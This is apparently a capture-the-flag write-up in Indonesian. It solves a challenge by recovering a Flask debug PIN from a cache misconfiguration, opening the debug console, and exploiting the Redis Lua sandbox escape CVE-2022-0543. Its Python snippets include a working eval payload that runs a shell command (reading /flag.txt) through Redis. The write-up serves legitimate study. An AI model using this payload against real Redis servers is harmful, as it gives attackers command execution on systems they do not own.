# How to solve
Pertama kita perlu mendapatkan flask pin dari miss configration pada cache.

Setelah itu kita pakai pin itu untuk ke endpoint console.

Pada endpoint console kita perlu mendapatkan akses redis menggunakan vulnerability CVE-2022-0543. Kita bisa mengecek versi redis ini menggunakan command `info server`
```py
import redis;
r = redis.Redis("redis", 6379);
print(r.execute_command("info server").decode());
```

Untuk mendapatkan remote address kita menggunakan payload dari CVE-2022-0543 dari poc [ini](https://github.com/vulhub/vulhub/tree/master/redis/CVE-2022-0543).

```py
import redis;
r = redis.Redis("redis", 6379);
print(r.eval("""local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat /flag.txt", "r"); local res = f:read("*a"); f:close(); return res""",0));
```